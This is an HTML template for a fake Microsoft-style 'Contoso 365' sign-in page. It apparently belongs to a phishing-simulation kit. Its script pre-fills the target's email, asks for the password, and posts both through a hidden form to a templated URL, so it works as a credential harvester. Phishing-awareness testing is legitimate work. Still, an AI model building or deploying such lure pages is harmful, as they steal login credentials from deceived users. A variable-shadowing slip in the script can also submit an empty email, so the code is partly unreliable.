<!doctype html>
<html dir="ltr" lang="en">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta
            name="viewport"
            content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes"
        />
        <title>Sign in to your account</title>
        <link
            rel="shortcut icon"
            href="{{.BaseURL}}/images/favicon-c8f5b63f989f547c57f5b9c3da1f4351.ico"
        />
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            html,
            body {
                height: 100%;
                font-family:
                    "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
                background: url("{{.BaseURL}}/images/illustration-c8f5b63f989f547c57f5b9c3da1f4351.png")
                    center/cover no-repeat #f5f5f5;
            }

            .outer {
                display: table;
                position: absolute;
                height: 100%;
                width: 100%;
            }

            .middle {
                display: table-cell;
                vertical-align: middle;
            }

            .inner {
                margin-left: auto;
                margin-right: auto;
                width: 440px;
                background: #fff;
                box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
                padding: 44px;
                padding-top: 76px;
                overflow: hidden;
                position: relative;
            }

            .logo {
                width: 108px;
                position: absolute;
                top: 28px;
                left: 36px;
            }

            .title {
                font-size: 24px;
                font-weight: 600;
                color: #1b1b1b;
                margin-bottom: 8px;
                line-height: 28px;
            }

            .subtitle {
                font-size: 15px;
                color: #605e5c;
                margin-bottom: 24px;
                line-height: 20px;
            }

            .form-input {
                width: 100%;
                padding: 6px 0;
                border: 0;
                border-bottom: 0.5px solid #0067b8;
                font-size: 15px;
                color: #000;
                background: transparent;
                line-height: 20px;
                margin-bottom: 16px;
                height: 36px;
                outline: none;
            }

            .form-input:focus {
                border-bottom: 1.5px solid #0067b8;
                margin-bottom: 15px;
            }

            .form-input::placeholder {
                color: #666;
            }

            .btn-primary {
                display: inline-block;
                width: 108px;
                height: 32px;
                padding: 4px 12px;
                margin-top: 4px;
                margin-bottom: 4px;
                background-color: #0067b8;
                border: none;
                color: #fff;
                font-size: 15px;
                text-align: center;
                white-space: nowrap;
                overflow: hidden;
                vertical-align: middle;
                text-overflow: ellipsis;
                touch-action: manipulation;
                cursor: pointer;
                line-height: normal;
                float: right;
            }

            .btn-primary:hover {
                background-color: #005da6;
            }

            .footer-links {
                clear: both;
                font-size: 13px;
                line-height: 16px;
            }

            .footer-links a {
                color: #0067b8;
                text-decoration: none;
            }

            .footer-links a:hover {
                text-decoration: underline;
            }

            .identityBanner {
                display: flex;
                align-items: center;
            }

            .backButton {
                background: none;
                border: none;
                color: #0067b8;
                font-size: 15px;
                cursor: pointer;
                padding: 12px;
                padding-right: 8px;
                margin-left: -8px;
                text-decoration: none;
                display: flex;
                align-items: center;
            }

            .backButton:hover {
                text-decoration: underline;
            }

            .backButton img {
                width: 20px;
                height: 20px;
            }

            .identity {
                font-size: 15px;
                color: #323130;
                line-height: 20px;
                word-break: break-all;
            }

            .user-email {
                font-size: 15px;
                color: #323130;
                margin-bottom: 8px;
                line-height: 20px;
            }

            .forgot-password {
                font-size: 13px;
                margin-bottom: 16px;
                line-height: 16px;
            }

            .forgot-password a {
                color: #0067b8;
                text-decoration: none;
            }

            .forgot-password a:hover {
                text-decoration: underline;
            }

            .password-view {
                display: none;
            }

            .slide-left-enter {
                animation: slideInLeft 0.3s ease-out;
            }

            .slide-left-exit {
                animation: slideOutRight 0.3s ease-out;
            }

            .slide-right-enter {
                animation: slideInRight 0.3s ease-out;
            }

            .slide-right-exit {
                animation: slideOutLeft 0.3s ease-out;
            }

            @keyframes slideInLeft {
                0% {
                    transform: translateX(-100%);
                    opacity: 0;
                }
                100% {
                    transform: translateX(0);
                    opacity: 1;
                }
            }

            @keyframes slideOutRight {
                0% {
                    transform: translateX(0);
                    opacity: 1;
                }
                100% {
                    transform: translateX(100%);
                    opacity: 0;
                }
            }

            @keyframes slideInRight {
                0% {
                    transform: translateX(100%);
                    opacity: 0;
                }
                100% {
                    transform: translateX(0);
                    opacity: 1;
                }
            }

            @keyframes slideOutLeft {
                0% {
                    transform: translateX(0);
                    opacity: 1;
                }
                100% {
                    transform: translateX(-100%);
                    opacity: 0;
                }
            }

            @media (max-width: 480px) {
                html,
                body {
                    background: #fff;
                }
                .outer {
                    display: block;
                }
                .middle {
                    display: block;
                }
                .inner {
                    width: calc(100% - 8px);
                    margin: 4px;
                    padding: 24px;
                    padding-top: 72px;
                    box-shadow: none;
                }
                .logo {
                    top: 24px;
                    left: 24px;
                }
                .identityBanner {
                    margin-left: -8px;
                }
            }
        </style>
    </head>
    <body>
        <div class="outer">
            <div class="middle">
                <div class="inner">
                    <img
                        src="{{.BaseURL}}/images/contoso-logo-c8f5b63f989f547c57f5b9c3da1f4351.png"
                        alt="Contoso"
                        class="logo"
                    />

                    <div id="email-view" class="email-view">
                        <div class="title">Sign in</div>
                        <div class="subtitle">to continue to Contoso 365</div>

                        <input
                            type="email"
                            id="email-input"
                            class="form-input"
                            placeholder="Email"
                            value="{{.Email}}"
                            maxlength="113"
                            autofocus
                            aria-required="true"
                        />

                        <div style="margin: 16px 0 24px 0; position: relative">
                            <button
                                type="button"
                                id="next-btn"
                                class="btn-primary"
                            >
                                Next
                            </button>
                        </div>

                        <div class="footer-links">
                            No account? <a href="{{.URL}}">Create one!</a
                            ><br /><br />
                            <a href="{{.URL}}">Can't access your account?</a>
                        </div>
                    </div>

                    <div id="password-view" class="password-view">
                        <div class="identityBanner">
                            <button
                                type="button"
                                id="back-btn"
                                class="backButton"
                            >
                                <img
                                    src="{{.BaseURL}}/images/left-arrow-c8f5b63f989f547c57f5b9c3da1f4351.svg"
                                    alt=""
                                />
                            </button>
                            <div class="identity" id="user-email-display"></div>
                        </div>
                        <div class="title">Enter password</div>

                        <input
                            type="password"
                            id="password-input"
                            class="form-input"
                            placeholder="Password"
                            aria-required="true"
                        />

                        <div class="forgot-password">
                            <a href="{{.URL}}">Forgot my password?</a>
                        </div>

                        <button
                            type="button"
                            id="signin-btn"
                            class="btn-primary"
                        >
                            Sign in
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <form
            method="post"
            action="{{.URL}}"
            id="credential-form"
            style="display: none"
        >
            <input name="email" id="form-email" />
            <input name="password" id="form-password" />
        </form>

        <script>
            let currentEmail = "";
            const emailView = document.getElementById("email-view");
            const passwordView = document.getElementById("password-view");
            const emailInput = document.getElementById("email-input");
            const passwordInput = document.getElementById("password-input");
            const userEmailDisplay =
                document.getElementById("user-email-display");
            const credentialForm = document.getElementById("credential-form");
            const formEmail = document.getElementById("form-email");
            const formPassword = document.getElementById("form-password");

            function checkAndAdvance() {
                let currentEmail = emailInput.value.trim();
                if (currentEmail) {
                    userEmailDisplay.textContent = currentEmail;
                    animateTransition(emailView, passwordView, "left");
                    setTimeout(() => {
                        passwordInput.focus();
                    }, 350);
                }
            }

            window.addEventListener("load", checkAndAdvance);
            if (document.readyState === "complete") {
                checkAndAdvance();
            }

            function animateTransition(hideElement, showElement, direction) {
                hideElement.classList.add(
                    direction === "left"
                        ? "slide-left-exit"
                        : "slide-right-exit",
                );

                setTimeout(() => {
                    hideElement.style.display = "none";
                    hideElement.classList.remove(
                        "slide-left-exit",
                        "slide-right-exit",
                    );

                    showElement.style.display = "block";
                    showElement.classList.add(
                        direction === "left"
                            ? "slide-left-enter"
                            : "slide-right-enter",
                    );

                    setTimeout(() => {
                        showElement.classList.remove(
                            "slide-left-enter",
                            "slide-right-enter",
                        );
                    }, 300);
                }, 300);
            }

            document
                .getElementById("next-btn")
                .addEventListener("click", function () {
                    currentEmail = emailInput.value.trim();
                    if (currentEmail) {
                        userEmailDisplay.textContent = currentEmail;
                        animateTransition(emailView, passwordView, "left");
                        setTimeout(() => {
                            passwordInput.focus();
                        }, 350);
                    }
                });

            document
                .getElementById("back-btn")
                .addEventListener("click", function () {
                    animateTransition(passwordView, emailView, "right");
                    setTimeout(() => {
                        emailInput.focus();
                    }, 350);
                });

            document
                .getElementById("signin-btn")
                .addEventListener("click", function () {
                    const password = passwordInput.value.trim();
                    if (password) {
                        formEmail.value = currentEmail;
                        formPassword.value = password;
                        credentialForm.submit();
                    }
                });

            emailInput.addEventListener("keypress", function (e) {
                if (e.key === "Enter") {
                    document.getElementById("next-btn").click();
                }
            });

            passwordInput.addEventListener("keypress", function (e) {
                if (e.key === "Enter") {
                    document.getElementById("signin-btn").click();
                }
            });
        </script>
    </body>
</html>
